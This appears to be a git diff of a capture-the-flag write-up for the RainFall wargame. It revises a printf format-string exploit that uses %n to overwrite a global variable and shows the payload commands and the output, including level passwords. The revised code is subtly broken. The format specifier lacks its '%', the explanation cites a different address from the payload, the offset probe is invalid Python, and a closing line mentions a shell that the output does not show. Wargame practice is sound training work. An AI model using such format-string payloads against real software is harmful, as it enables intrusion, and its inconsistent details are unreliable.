@@ -56,8 +56,8 @@ Yes, if we make him read a sequence of chosen numbers he will possibly over-writ
 ## Step 4: Lets try to disass functions.
 
 We found two functions, `p()` and `n()`.
-`p()` uses printf,
-`n()` - reads our input,
+*`p()` uses printf,
+*`n()` - reads our input,
       - calls `p()`,
       - gives a value to m (a global variable empty so far) [0x8049810]
       - compare m with 0x1025544
@@ -82,30 +82,29 @@ Therefore, our goal is to use `%n` to write the value `16930116` into the memory
 python -c 'print "aaaa" + "%x" + 15' > /tmp/exploit
 cat /tmp/exploit | ./level4
 ```
-The ofset is at the 12th position.
+The ofset is at the 12th position, meaning that the first arg given to printf appears at the 12th position.
 
-We inject the address of `m` into the input, followed by a format string to write `64` bytes before using `%n`:
+We inject the address of `m` into the input, followed by a format string to write `16930116` bytes before using `%n`.
+Also it needs to be written at the 12th position.
 
 ```bash
-python -c 'print "\x8c\x98\x04\x08" + "%60u" + "%4$n"' > /tmp/exploit
+python -c 'print "\x10\x98\x04\x08" + "16930112d%12$n"' > /tmp/exploit
 ```
 
 Explanation:
 
 * `\x8c\x98\x04\x08` → address of `m` in little-endian.
-* `%60u` → prints 60 characters.
-* `%4$n` → writes the number of printed characters (60 + 4 = 64) into the 4th argument on the stack (our `m` address).
+* `16930112d` → prints 16930112 decimals.
+* `%12$n` → our `m` address.
 
 ---
 
 ## Step 7: Run Exploit
 
 ```bash
-level3@RainFall:~$ ./level3 < /tmp/exploit
-whoami
-level4
-cat /home/user/level4/.pass
-4c7e7b3068693b3c1a4d3ff39f0c9ca78eb2d2f63bdba4a1d2a8e1da7544f44e
+level4@RainFall:~$ cat /tmp/exploit | ./level4
+                                                                                     -1208015184
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
 
 We successfully overwrite `m` and trigger the hidden shell.
@@ -120,5 +119,6 @@ We successfully overwrite `m` and trigger the hidden shell.
 * **Outcome:** gained a shell as `level4` and retrieved the password.
 
 > With this, you can `su level4` using the password.
+
 
 
